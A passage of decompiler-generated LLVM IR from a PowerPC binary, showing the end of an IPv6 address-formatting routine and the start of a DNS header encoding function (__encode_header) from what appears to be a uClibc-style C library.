  store i32 %v0_1001412c42, i32* @r28, align 4
  br label %dec_label_pc_10014160.thread

dec_label_pc_10014160.thread:                     ; preds = %dec_label_pc_10014158, %dec_label_pc_10014150
  %v0_1001416876 = phi i32 [ %v1_10014150, %dec_label_pc_10014150 ], [ %v0_10014158.pre, %dec_label_pc_10014158 ]
  %v0_10014160.ph = phi i32 [ %v0_1001411c39, %dec_label_pc_10014150 ], [ %v0_1001412c42, %dec_label_pc_10014158 ]
  %v1_1001416059 = icmp slt i32 %v0_10014160.ph, -1
  %v3_1001416061 = icmp eq i32 %v0_10014160.ph, -1
  store i1 %v1_1001416059, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001416061, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_10014168

dec_label_pc_10014160:                            ; preds = %dec_label_pc_10014140
  br i1 %v3_10014160, label %dec_label_pc_10014174, label %dec_label_pc_10014160.dec_label_pc_10014168_crit_edge

dec_label_pc_10014160.dec_label_pc_10014168_crit_edge: ; preds = %dec_label_pc_10014160
  %v0_10014168.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10014168

dec_label_pc_10014168:                            ; preds = %dec_label_pc_10014160.dec_label_pc_10014168_crit_edge, %dec_label_pc_10014160.thread
  %v0_10014168 = phi i32 [ %v0_1001416876, %dec_label_pc_10014160.thread ], [ %v0_10014168.pre, %dec_label_pc_10014160.dec_label_pc_10014168_crit_edge ]
  %v0_1001416062 = phi i32 [ %v0_10014160.ph, %dec_label_pc_10014160.thread ], [ %v0_1001411c39, %dec_label_pc_10014160.dec_label_pc_10014168_crit_edge ]
  %v1_10014168 = icmp slt i32 %v0_10014168, 1
  %v2_10014168 = icmp sgt i32 %v0_10014168, 1
  %v3_10014168 = icmp eq i32 %v0_10014168, 1
  store i1 %v1_10014168, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014168, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10014168, label %dec_label_pc_10014174, label %dec_label_pc_10014170

dec_label_pc_10014170:                            ; preds = %dec_label_pc_10014168
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_10014174

dec_label_pc_10014174:                            ; preds = %dec_label_pc_10014168, %dec_label_pc_10014160, %dec_label_pc_10014170
  %v0_100141803 = phi i32 [ %v0_1001416062, %dec_label_pc_10014168 ], [ -1, %dec_label_pc_10014160 ], [ -1, %dec_label_pc_10014170 ]
  %v2_10014174 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_10014174, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %v1_100141804 = icmp slt i32 %v0_100141803, -1
  %v3_100141806 = icmp eq i32 %v0_100141803, -1
  store i1 %v1_100141804, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100141806, i1* %cr7_eq.global-to-local, align 1
  %v2_100141f0 = icmp slt i32 %tmp, 65535
  %v4_100141f0 = icmp eq i32 %tmp, 65535
  br label %dec_label_pc_10014180

dec_label_pc_10014180:                            ; preds = %dec_label_pc_10014174, %dec_label_pc_1001424c
  %v2_100141bc = phi i32 [ %v2_10014174, %dec_label_pc_10014174 ], [ %v2_100141a451, %dec_label_pc_1001424c ]
  %v0_10014190 = phi i32 [ %v0_100141803, %dec_label_pc_10014174 ], [ %v0_10014180, %dec_label_pc_1001424c ]
  %v0_100141b0 = phi i32 [ 0, %dec_label_pc_10014174 ], [ %v1_1001424c, %dec_label_pc_1001424c ]
  %v3_100141807 = phi i1 [ %v3_100141806, %dec_label_pc_10014174 ], [ %v3_10014180, %dec_label_pc_1001424c ]
  br i1 %v3_100141807, label %dec_label_pc_100141b0, label %dec_label_pc_10014188

dec_label_pc_10014188:                            ; preds = %dec_label_pc_10014180
  %v2_10014188 = icmp slt i32 %v0_100141b0, %v0_10014190
  %v4_10014188 = icmp eq i32 %v0_100141b0, %v0_10014190
  br i1 %v2_10014188, label %dec_label_pc_100141b0, label %dec_label_pc_10014190

dec_label_pc_10014190:                            ; preds = %dec_label_pc_10014188
  %v1_10014190 = load i32, i32* @r30, align 4
  %v2_10014190 = add i32 %v1_10014190, %v0_10014190
  %v2_10014194 = icmp slt i32 %v0_100141b0, %v2_10014190
  %v4_10014194 = icmp eq i32 %v0_100141b0, %v2_10014190
  store i1 %v2_10014194, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10014194, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10014194, label %dec_label_pc_1001419c, label %dec_label_pc_100141b0

dec_label_pc_1001419c:                            ; preds = %dec_label_pc_10014190
  br i1 %v4_10014188, label %dec_label_pc_100141a0, label %dec_label_pc_1001424c

dec_label_pc_100141a0:                            ; preds = %dec_label_pc_1001419c
  %v3_100141a4 = inttoptr i32 %v2_100141bc to i8*
  store i8 58, i8* %v3_100141a4, align 1
  %v0_100141a8 = load i32, i32* %r29.global-to-local, align 4
  %v1_100141a8 = add i32 %v0_100141a8, 1
  store i32 %v1_100141a8, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1001424c

dec_label_pc_100141b0:                            ; preds = %dec_label_pc_10014190, %dec_label_pc_10014188, %dec_label_pc_10014180
  %v1_100141b0 = icmp slt i32 %v0_100141b0, 0
  %v3_100141b0 = icmp eq i32 %v0_100141b0, 0
  store i1 %v1_100141b0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100141b0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100141b0, label %dec_label_pc_100141c4.thread, label %dec_label_pc_100141c4

dec_label_pc_100141c4.thread:                     ; preds = %dec_label_pc_100141b0
  store i1 true, i1* %cr7_lt.global-to-local, align 1
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_10014228

dec_label_pc_100141c4:                            ; preds = %dec_label_pc_100141b0
  %v3_100141bc = inttoptr i32 %v2_100141bc to i8*
  store i8 58, i8* %v3_100141bc, align 1
  %v0_100141c0 = load i32, i32* %r29.global-to-local, align 4
  %v1_100141c0 = add i32 %v0_100141c0, 1
  store i32 %v1_100141c0, i32* %r29.global-to-local, align 4
  %v0_100141c4.pre = load i32, i32* @r31, align 4
  %v1_100141c4 = icmp slt i32 %v0_100141c4.pre, 6
  %v3_100141c4 = icmp eq i32 %v0_100141c4.pre, 6
  store i1 %v1_100141c4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100141c4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100141c4, label %dec_label_pc_100141cc, label %dec_label_pc_10014228

dec_label_pc_100141cc:                            ; preds = %dec_label_pc_100141c4
  %v0_100141cc = load i32, i32* @r28, align 4
  %v1_100141cc = icmp slt i32 %v0_100141cc, 0
  %v3_100141cc = icmp eq i32 %v0_100141cc, 0
  store i1 %v1_100141cc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100141cc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100141cc, label %dec_label_pc_100141d4, label %dec_label_pc_10014228

dec_label_pc_100141d4:                            ; preds = %dec_label_pc_100141cc
  %v0_100141d4 = load i32, i32* @r30, align 4
  %v1_100141d4 = icmp slt i32 %v0_100141d4, 6
  %v3_100141d4 = icmp eq i32 %v0_100141d4, 6
  store i1 %v1_100141d4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100141d4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100141d4, label %dec_label_pc_100141f8, label %dec_label_pc_100141dc

dec_label_pc_100141dc:                            ; preds = %dec_label_pc_100141d4
  %v1_100141dc = icmp slt i32 %v0_100141d4, 5
  %v3_100141dc = icmp eq i32 %v0_100141d4, 5
  store i1 %v1_100141dc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100141dc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100141dc, label %dec_label_pc_100141e4, label %dec_label_pc_10014228

dec_label_pc_100141e4:                            ; preds = %dec_label_pc_100141dc
  store i32 %tmp, i32* %r9.global-to-local, align 4
  store i1 %v2_100141f0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100141f0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_100141f0, label %dec_label_pc_100141f8, label %dec_label_pc_10014228

dec_label_pc_100141f8:                            ; preds = %dec_label_pc_100141e4, %dec_label_pc_100141d4
  %v1_100141f8 = load i32, i32* @r1, align 4
  %v2_100141f8 = sub i32 %v1_100141f8, %v1_100141c0
  %v0_100141fc = load i32, i32* @r27, align 4
  %v1_100141fc = add i32 %v0_100141fc, 12
  %v1_10014200 = add i32 %v2_100141f8, 86
  store i32 ptrtoint ([3 x i8]* @global_var_1001420c.740 to i32), i32* @lr, align 4
  %v3_10014208 = call i32 @inet_ntop4(i32 %v1_100141fc, i32 %v1_100141c0, i32 %v1_10014200)
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_10014210 = icmp slt i32 %v3_10014208, 0
  %v3_10014210 = icmp eq i32 %v3_10014208, 0
  store i1 %v1_10014210, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014210, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014210, label %dec_label_pc_100142c8, label %dec_label_pc_10014218

dec_label_pc_10014218:                            ; preds = %dec_label_pc_100141f8
  %v0_10014218 = load i32, i32* @r29, align 4
  store i32 %v0_10014218, i32* @r3, align 4
  %v0_1001421c = call i32 @__GI_strlen()
  %v0_10014220 = load i32, i32* @r29, align 4
  %v2_10014220 = add i32 %v0_10014220, %v0_1001421c
  store i32 %v2_10014220, i32* %r29.global-to-local, align 4
  %v0_10014260.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10014260

dec_label_pc_10014228:                            ; preds = %dec_label_pc_100141c4.thread, %dec_label_pc_100141e4, %dec_label_pc_100141dc, %dec_label_pc_100141cc, %dec_label_pc_100141c4
  %v0_1001422867 = phi i32 [ 0, %dec_label_pc_100141c4.thread ], [ 6, %dec_label_pc_100141e4 ], [ 6, %dec_label_pc_100141dc ], [ 6, %dec_label_pc_100141cc ], [ %v0_100141c4.pre, %dec_label_pc_100141c4 ]
  %v0_1001420466 = phi i32 [ %v2_100141bc, %dec_label_pc_100141c4.thread ], [ %v1_100141c0, %dec_label_pc_100141e4 ], [ %v1_100141c0, %dec_label_pc_100141dc ], [ %v1_100141c0, %dec_label_pc_100141cc ], [ %v1_100141c0, %dec_label_pc_100141c4 ]
  %v1_10014228 = mul i32 %v0_1001422867, 4
  store i32 %v2_10014080, i32* %r9.global-to-local, align 4
  %v2_10014230 = add i32 %v1_10014228, %v2_10014080
  %v3_10014230 = inttoptr i32 %v2_10014230 to i32*
  %v4_10014230 = load i32, i32* %v3_10014230, align 4
  store i32 %v0_1001420466, i32* @r3, align 4
  store i32 268517960, i32* @lr, align 4
  %v5_10014244 = load i32, i32* @r7, align 4
  %v6_10014244 = load i32, i32* @r8, align 4
  %v9_10014244 = call i32 @sprintf(i32 %v0_1001420466, i32 ptrtoint ([3 x i8]* @global_var_10018204.741 to i32), i32 %v4_10014230, i32 %v2_10014080, i32 %v5_10014244, i32 %v6_10014244, i32 %v2_10014080, i32 ptrtoint (i32* @0 to i32))
  %v0_10014248 = load i32, i32* @r29, align 4
  %v2_10014248 = add i32 %v0_10014248, %v9_10014244
  store i32 %v2_10014248, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1001424c

dec_label_pc_1001424c:                            ; preds = %dec_label_pc_1001419c, %dec_label_pc_100141a0, %dec_label_pc_10014228
  %v2_100141a451 = phi i32 [ %v2_100141bc, %dec_label_pc_1001419c ], [ %v1_100141a8, %dec_label_pc_100141a0 ], [ %v2_10014248, %dec_label_pc_10014228 ]
  %v0_1001424c = load i32, i32* @r31, align 4
  %v1_1001424c = add i32 %v0_1001424c, 1
  store i32 %v1_1001424c, i32* @r31, align 4
  %tmp73 = icmp slt i32 %v1_1001424c, 8
  %v0_10014180 = load i32, i32* @r28, align 4
  %v1_10014180 = icmp slt i32 %v0_10014180, -1
  %v3_10014180 = icmp eq i32 %v0_10014180, -1
  store i1 %v1_10014180, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014180, i1* %cr7_eq.global-to-local, align 1
  br i1 %tmp73, label %dec_label_pc_10014180, label %dec_label_pc_10014258

dec_label_pc_10014258:                            ; preds = %dec_label_pc_1001424c
  br i1 %v3_10014180, label %dec_label_pc_10014278, label %dec_label_pc_10014260

dec_label_pc_10014260:                            ; preds = %dec_label_pc_10014258, %dec_label_pc_10014218
  %v2_10014270 = phi i32 [ %v2_100141a451, %dec_label_pc_10014258 ], [ %v2_10014220, %dec_label_pc_10014218 ]
  %v0_10014260 = phi i32 [ %v0_10014180, %dec_label_pc_10014258 ], [ %v0_10014260.pre, %dec_label_pc_10014218 ]
  %v1_10014260 = load i32, i32* @r30, align 4
  %v2_10014260 = add i32 %v1_10014260, %v0_10014260
  %v1_10014264 = icmp slt i32 %v2_10014260, 8
  %v3_10014264 = icmp eq i32 %v2_10014260, 8
  store i1 %v1_10014264, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014264, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014264, label %dec_label_pc_1001426c, label %dec_label_pc_10014278

dec_label_pc_1001426c:                            ; preds = %dec_label_pc_10014260
  %v3_10014270 = inttoptr i32 %v2_10014270 to i8*
  store i8 58, i8* %v3_10014270, align 1
  %v0_10014274 = load i32, i32* %r29.global-to-local, align 4
  %v1_10014274 = add i32 %v0_10014274, 1
  store i32 %v1_10014274, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10014278

dec_label_pc_10014278:                            ; preds = %dec_label_pc_10014260, %dec_label_pc_10014258, %dec_label_pc_1001426c
  %v2_1001428c = phi i32 [ %v2_10014270, %dec_label_pc_10014260 ], [ %v2_100141a451, %dec_label_pc_10014258 ], [ %v1_10014274, %dec_label_pc_1001426c ]
  %v1_10014278 = sub i32 1, %v2_10014174
  %v2_10014280 = add i32 %v1_10014278, %v2_1001428c
  %v1_10014284 = load i32, i32* @r26, align 4
  %v2_10014284 = icmp ult i32 %v2_10014280, %v1_10014284
  %v4_10014284 = icmp eq i32 %v2_10014280, %v1_10014284
  store i1 %v2_10014284, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10014284, i1* %cr7_eq.global-to-local, align 1
  %v3_1001428c = inttoptr i32 %v2_1001428c to i8*
  store i8 0, i8* %v3_1001428c, align 1
  %v0_10014290 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_10014290 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_10014290 = or i1 %v0_10014290, %v1_10014290
  br i1 %v2_10014290, label %dec_label_pc_100142a8, label %dec_label_pc_10014294

dec_label_pc_10014294:                            ; preds = %dec_label_pc_10014278
  %v0_10014294 = call i32 @__errno_location()
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_100142a0 = inttoptr i32 %v0_10014294 to i32*
  store i32 28, i32* %v2_100142a0, align 4
  %v0_100142cc.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100142c8

dec_label_pc_100142a8:                            ; preds = %dec_label_pc_10014278
  %v0_100142a8 = load i32, i32* @r25, align 4
  %v2_100142ac = bitcast i32* %stack_var_-88 to i8*
  %v3_100142ac = call i32 @strcpy(i32 %v0_100142a8, i8* %v2_100142ac)
  br label %dec_label_pc_100142b0

dec_label_pc_100142b0:                            ; preds = %dec_label_pc_1001406c, %dec_label_pc_100142a8
  %storemerge1 = phi i32 [ %v3_10014078, %dec_label_pc_1001406c ], [ %v3_100142ac, %dec_label_pc_100142a8 ]
  store i32 %storemerge1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100142c8

dec_label_pc_100142b8:                            ; preds = %dec_label_pc_10014060
  %v0_100142b8 = call i32 @__errno_location()
  %v2_100142c0 = inttoptr i32 %v0_100142b8 to i32*
  store i32 97, i32* %v2_100142c0, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100142c8

dec_label_pc_100142c8:                            ; preds = %dec_label_pc_100141f8, %dec_label_pc_100142b0, %dec_label_pc_10014294, %dec_label_pc_100142b8
  %v0_100142cc = phi i32 [ 0, %dec_label_pc_100141f8 ], [ %storemerge1, %dec_label_pc_100142b0 ], [ %v0_100142cc.pre, %dec_label_pc_10014294 ], [ 0, %dec_label_pc_100142b8 ]
  ret i32 %v0_100142cc

; uselistorder directives
  uselistorder i32 %v2_1001428c, { 1, 0 }
  uselistorder i32 %v2_10014260, { 1, 0 }
  uselistorder i1 %v3_10014180, { 0, 2, 1 }
  uselistorder i32 %v0_10014180, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1001424c, { 2, 1, 0 }
  uselistorder i32 %v0_1001420466, { 1, 0 }
  uselistorder i32 %v3_10014208, { 1, 0 }
  uselistorder i32 %v0_100141d4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100141c4.pre, { 2, 0, 1 }
  uselistorder i32 %v1_100141c0, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v2_10014190, { 1, 0 }
  uselistorder i32 %v0_100141b0, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v0_10014190, { 0, 2, 1 }
  uselistorder i32 %v2_100141bc, { 3, 0, 1, 2 }
  uselistorder i32 %v0_100141803, { 0, 2, 1 }
  uselistorder i32 %v0_10014168, { 2, 1, 0 }
  uselistorder i32 %v0_10014158.pre, { 0, 1, 4, 3, 2 }
  uselistorder i1 %v3_10014160, { 1, 0, 2 }
  uselistorder i32 %v1_1001413c, { 2, 1, 0 }
  uselistorder i32 %v1_10014138, { 1, 0 }
  uselistorder i32 %v0_1001411c39, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1001412c42, { 0, 2, 1, 3 }
  uselistorder i1 %v3_100140f0, { 1, 0 }
  uselistorder i32 %v0_10014138, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v0_100140f0, { 1, 0 }
  uselistorder i32 %v0_1001411c, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1001412c, { 2, 3, 0, 1 }
  uselistorder i32 %v1_100140cc, { 1, 0 }
  uselistorder i32 %v2_100140c4, { 1, 0 }
  uselistorder i32 %v0_100140bc, { 1, 0, 2 }
  uselistorder i32 %v1_100140a4, { 1, 0 }
  uselistorder i32 %v2_10014080, { 3, 2, 0, 4, 1, 5, 6 }
  uselistorder i32* %r29.global-to-local, { 0, 5, 1, 2, 3, 6, 4, 7, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 17, 9, 10, 18, 12, 16, 14, 13, 15, 19 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 16, 9, 10, 18, 12, 17, 14, 13, 15, 19 }
  uselistorder i32 97, { 4, 5, 8, 7, 6, 0, 9, 3, 1, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sprintf, { 3, 0, 2, 1 }
  uselistorder i32* @r8, { 5, 9, 10, 11, 1, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 68, 69, 70, 71, 2, 61, 65, 66, 67, 7, 8, 72, 74, 75, 42, 62, 63, 64, 73, 43, 44, 45, 46, 47, 48, 49, 3, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 0, 60, 4, 6 }
  uselistorder i32* @r7, { 10, 11, 12, 13, 0, 14, 15, 16, 17, 1, 18, 19, 6, 20, 21, 22, 23, 2, 35, 36, 37, 8, 24, 25, 26, 27, 28, 29, 30, 31, 3, 32, 7, 4, 5, 33, 34, 9 }
  uselistorder i32* @r1, { 2, 4, 3, 1, 11, 0, 12, 13, 14, 5, 6, 7, 8, 9, 10, 15 }
  uselistorder i1 true, { 3, 0, 5, 6, 1, 2, 4 }
  uselistorder i8 58, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 65535, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__GI_memset, { 25, 24, 13, 2, 12, 11, 18, 0, 5, 1, 17, 23, 22, 21, 20, 19, 16, 15, 14, 10, 9, 8, 7, 6, 4, 3 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_100142c8, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_100142b0, { 1, 0 }
  uselistorder label %dec_label_pc_10014278, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001424c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10014228, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_10014180, { 1, 0 }
  uselistorder label %dec_label_pc_10014174, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10014158, { 1, 0 }
  uselistorder label %dec_label_pc_10014138, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10014134, { 1, 0 }
  uselistorder label %dec_label_pc_100140ec, { 1, 0 }
  uselistorder label %dec_label_pc_100140a4, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 -1, i32* %r7.global-to-local, align 4
  %tmp2 = icmp slt i32 %arg3, 12
  br i1 %tmp2, label %dec_label_pc_100143c4, label %dec_label_pc_100142ec

dec_label_pc_100142ec:                            ; preds = %entry
  %tmp3 = inttoptr i32 %arg2 to i8*
  %v1_100142ec = add i32 %tmp, 2
  %v2_100142ec = inttoptr i32 %v1_100142ec to i8*
  %v3_100142ec = load i8, i8* %v2_100142ec, align 1
  %v4_100142ec = zext i8 %v3_100142ec to i32
  store i32 %v4_100142ec, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r7.global-to-local, align 4
  store i8 %v3_100142ec, i8* %tmp3, align 1
  %v2_100142f8 = load i32, i32* %arg1, align 4
  store i32 %v2_100142f8, i32* %r0.global-to-local, align 4
  %v1_100142fc = trunc i32 %v2_100142f8 to i8
  %v4_100142fc = add i32 %arg2, 1
  %v5_100142fc = inttoptr i32 %v4_100142fc to i8*
  store i8 %v1_100142fc, i8* %v5_100142fc, align 1
  %v1_10014300 = add i32 %tmp, 12
  %v2_10014300 = inttoptr i32 %v1_10014300 to i32*
  %v3_10014300 = load i32, i32* %v2_10014300, align 4
  store i32 %v3_10014300, i32* %r0.global-to-local, align 4
  %v1_10014304 = add i32 %tmp, 16
  %v2_10014304 = inttoptr i32 %v1_10014304 to i32*
  %v3_10014304 = load i32, i32* %v2_10014304, align 4
  store i32 %v3_10014304, i32* %r11.global-to-local, align 4
  %v1_10014308 = add i32 %tmp, 4
  %v2_10014308 = inttoptr i32 %v1_10014308 to i32*
  %v3_10014308 = load i32, i32* %v2_10014308, align 4
  %v2_1001430c = icmp ne i32 %v3_10014300, 0
  %v5_10014310 = zext i1 %v2_1001430c to i32
  store i32 %v5_10014310, i32* %r10.global-to-local, align 4
  %v1_10014314 = add i32 %tmp, 8
  %v2_10014314 = inttoptr i32 %v1_10014314 to i32*
  %v3_10014314 = load i32, i32* %v2_10014314, align 4
  %v2_10014318 = icmp ne i32 %v3_10014304, 0
  %v5_1001431c = zext i1 %v2_10014318 to i32
  %v1_10014320 = add i32 %tmp, 20
  %v2_10014320 = inttoptr i32 %v1_10014320 to i32*
  %v3_10014320 = load i32, i32* %v2_10014320, align 4
  store i32 %v3_10014320, i32* %r0.global-to-local, align 4
  %not.v2_10014324 = icmp eq i32 %v3_10014308, 0
  %v6_10014328 = sext i1 %not.v2_10014324 to i32
  store i32 %v5_1001431c, i32* %r11.global-to-local, align 4
  %v1_10014330 = call i32 @__asm_rlwinm(i32 %v6_10014328, i32 0, i32 24, i32 24)
  %v0_10014334 = load i32, i32* %r10.global-to-local, align 4
  %v1_10014334 = mul i32 %v0_10014334, 4
  store i32 %v1_10014334, i32* %r10.global-to-local, align 4
  %v1_10014338 = call i32 @__asm_rlwinm(i32 %v3_10014314, i32 3, i32 25, i32 28)
  %v0_1001433c = load i32, i32* %r0.global-to-local, align 4
  %v2_1001433c = icmp ne i32 %v0_1001433c, 0
  %v5_10014340 = zext i1 %v2_1001433c to i32
  %v2_10014344 = or i32 %v1_10014334, %v1_10014338
  store i32 %v2_10014344, i32* %r10.global-to-local, align 4
  %v1_10014348 = add i32 %v1_10014330, 128
  %v0_1001434c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001434c = mul i32 %v0_1001434c, 2
  store i32 %v1_1001434c, i32* %r11.global-to-local, align 4
  %v2_10014350 = or i32 %v2_10014344, %v5_10014340
  store i32 %v2_10014350, i32* %r0.global-to-local, align 4
  %v2_10014354 = or i32 %v2_10014350, %v1_10014348
  %v2_10014358 = or i32 %v2_10014354, %v1_1001434c
  %v1_1001435c = trunc i32 %v2_10014358 to i8
  %v4_1001435c = add i32 %arg2, 2
  %v5_1001435c = inttoptr i32 %v4_1001435c to i8*
  store i8 %v1_1001435c, i8* %v5_1001435c, align 1
  %v1_10014360 = add i32 %tmp, 24
  %v2_10014360 = inttoptr i32 %v1_10014360 to i32*
  %v3_10014360 = load i32, i32* %v2_10014360, align 4
  %v1_10014364 = add i32 %tmp, 28
  %v2_10014364 = inttoptr i32 %v1_10014364 to i32*
  %v3_10014364 = load i32, i32* %v2_10014364, align 4
  store i32 %v3_10014364, i32* %r0.global-to-local, align 4
  %not.v2_10014368 = icmp eq i32 %v3_10014360, 0
  %v6_1001436c = sext i1 %not.v2_10014368 to i32
  %v1_10014370 = call i32 @__asm_rlwinm(i32 %v6_1001436c, i32 0, i32 24, i32 24)
  %v1_10014374 = urem i32 %v3_10014364, 16
  store i32 %v1_10014374, i32* %r0.global-to-local, align 4
  %v1_10014378 = add i32 %v1_10014370, 128
  %v2_1001437c = or i32 %v1_10014374, %v1_10014378
  %v1_10014380 = trunc i32 %v2_1001437c to i8
  %v4_10014380 = add i32 %arg2, 3
  %v5_10014380 = inttoptr i32 %v4_10014380 to i8*
  store i8 %v1_10014380, i8* %v5_10014380, align 1
  %v1_10014384 = add i32 %tmp, 34
  %v2_10014384 = inttoptr i32 %v1_10014384 to i8*
  %v3_10014384 = load i8, i8* %v2_10014384, align 1
  %v4_10014384 = zext i8 %v3_10014384 to i32
  store i32 %v4_10014384, i32* %r0.global-to-local, align 4
  %v4_10014388 = add i32 %arg2, 4
  %v5_10014388 = inttoptr i32 %v4_10014388 to i8*
  store i8 %v3_10014384, i8* %v5_10014388, align 1
  %v1_1001438c = add i32 %tmp, 32
  %v2_1001438c = inttoptr i32 %v1_1001438c to i32*
  %v3_1001438c = load i32, i32* %v2_1001438c, align 4
  store i32 %v3_1001438c, i32* %r0.global-to-local, align 4
  %v1_10014390 = trunc i32 %v3_1001438c to i8
  %v4_10014390 = add i32 %arg2, 5
  %v5_10014390 = inttoptr i32 %v4_10014390 to i8*
  store i8 %v1_10014390, i8* %v5_10014390, align 1
  %v1_10014394 = add i32 %tmp, 38
  %v2_10014394 = inttoptr i32 %v1_10014394 to i8*
  %v3_10014394 = load i8, i8* %v2_10014394, align 1
  %v4_10014394 = zext i8 %v3_10014394 to i32
  store i32 %v4_10014394, i32* %r0.global-to-local, align 4
  %v4_10014398 = add i32 %arg2, 6
  %v5_10014398 = inttoptr i32 %v4_10014398 to i8*
  store i8 %v3_10014394, i8* %v5_10014398, align 1
  %v1_1001439c = add i32 %tmp, 36
  %v2_1001439c = inttoptr i32 %v1_1001439c to i32*
  %v3_1001439c = load i32, i32* %v2_1001439c, align 4
  store i32 %v3_1001439c, i32* %r0.global-to-local, align 4
  %v1_100143a0 = trunc i32 %v3_1001439c to i8
  %v4_100143a0 = add i32 %arg2, 7
  %v5_100143a0 = inttoptr i32 %v4_100143a0 to i8*
  store i8 %v1_100143a0, i8* %v5_100143a0, align 1
  %v1_100143a4 = add i32 %tmp, 42
  %v2_100143a4 = inttoptr i32 %v1_100143a4 to i8*
  %v3_100143a4 = load i8, i8* %v2_100143a4, align 1
  %v4_100143a4 = zext i8 %v3_100143a4 to i32
  store i32 %v4_100143a4, i32* %r0.global-to-local, align 4
  %v4_100143a8 = add i32 %arg2, 8
  %v5_100143a8 = inttoptr i32 %v4_100143a8 to i8*
  store i8 %v3_100143a4, i8* %v5_100143a8, align 1
  %v1_100143ac = add i32 %tmp, 40
  %v2_100143ac = inttoptr i32 %v1_100143ac to i32*
  %v3_100143ac = load i32, i32* %v2_100143ac, align 4
  store i32 %v3_100143ac, i32* %r0.global-to-local, align 4
  %v1_100143b0 = trunc i32 %v3_100143ac to i8
  %v4_100143b0 = add i32 %arg2, 9
  %v5_100143b0 = inttoptr i32 %v4_100143b0 to i8*
  store i8 %v1_100143b0, i8* %v5_100143b0, align 1
  %v1_100143b4 = add i32 %tmp, 46
  %v2_100143b4 = inttoptr i32 %v1_100143b4 to i8*
  %v3_100143b4 = load i8, i8* %v2_100143b4, align 1
  %v4_100143b4 = zext i8 %v3_100143b4 to i32
  store i32 %v4_100143b4, i32* %r0.global-to-local, align 4
  %v4_100143b8 = add i32 %arg2, 10
  %v5_100143b8 = inttoptr i32 %v4_100143b8 to i8*
  store i8 %v3_100143b4, i8* %v5_100143b8, align 1
  %v1_100143bc = add i32 %tmp, 44
  %v2_100143bc = inttoptr i32 %v1_100143bc to i32*
  %v3_100143bc = load i32, i32* %v2_100143bc, align 4
  store i32 %v3_100143bc, i32* %r0.global-to-local, align 4
